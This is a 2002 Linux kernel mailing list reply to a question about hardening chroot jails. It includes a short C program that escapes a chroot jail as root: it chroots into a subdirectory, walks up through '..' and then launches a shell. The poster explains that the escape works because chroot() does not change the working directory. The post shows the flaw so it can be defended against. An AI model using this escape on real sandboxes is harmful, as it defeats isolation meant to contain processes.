Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S317453AbSGEOAc>; Fri, 5 Jul 2002 10:00:32 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S317452AbSGEOAb>; Fri, 5 Jul 2002 10:00:31 -0400
Received: from ncc1701.cistron.net ([62.216.30.38]:24841 "EHLO
	ncc1701.cistron.net") by vger.kernel.org with ESMTP
	id <S317451AbSGEOAa>; Fri, 5 Jul 2002 10:00:30 -0400
From: "Miquel van Smoorenburg" <miquels@cistron.nl>
Subject: Re: prevent breaking a chroot() jail?
Date: Fri, 5 Jul 2002 14:02:58 +0000 (UTC)
Organization: Cistron
Message-ID: <ag48ui$fb5$1@ncc1701.cistron.net>
References: <1025877004.11004.59.camel@zaphod>
Content-Type: text/plain; charset=iso-8859-15
X-Trace: ncc1701.cistron.net 1025877778 15717 62.216.29.67 (5 Jul 2002 14:02:58 GMT)
X-Complaints-To: abuse@cistron.nl
X-Newsreader: trn 4.0-test76 (Apr 2, 2001)
Originator: miquels@cistron-office.nl (Miquel van Smoorenburg)
To: linux-kernel@vger.kernel.org
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

In article <1025877004.11004.59.camel@zaphod>,
Shaya Potter  <spotter@cs.columbia.edu> wrote:
>I'm trying to develop a way to ensure that one can't break out of a
>chroot() jail, even as root.  I'm willing to change the way the syscalls
>work (most likely only for a subset of processes, i.e. processes that
>are run in the jail end up getting a marker which is passed down to all
>their children that causes the syscalls to behave differently).
>What should I be aware of?  I figure devices (no need to run mknod in
>this jail) and chroot (as per man page), is there any other way of
>breaking the chroot jail (at a syscall level or otherwise)?

int main()
{
	chdir("/");
	mkdir("foo");
	chroot("foo");
	chdir("../../../../../../..");
	chroot(".");
	execl("/bin/sh", "sh", NULL);
}

Run as root and you're out of the chroot jail. This is because
chroot() doesn't chdir() to the new root, so after a chroot() in
the chroot jail you're suddenly out of it.

Mike.

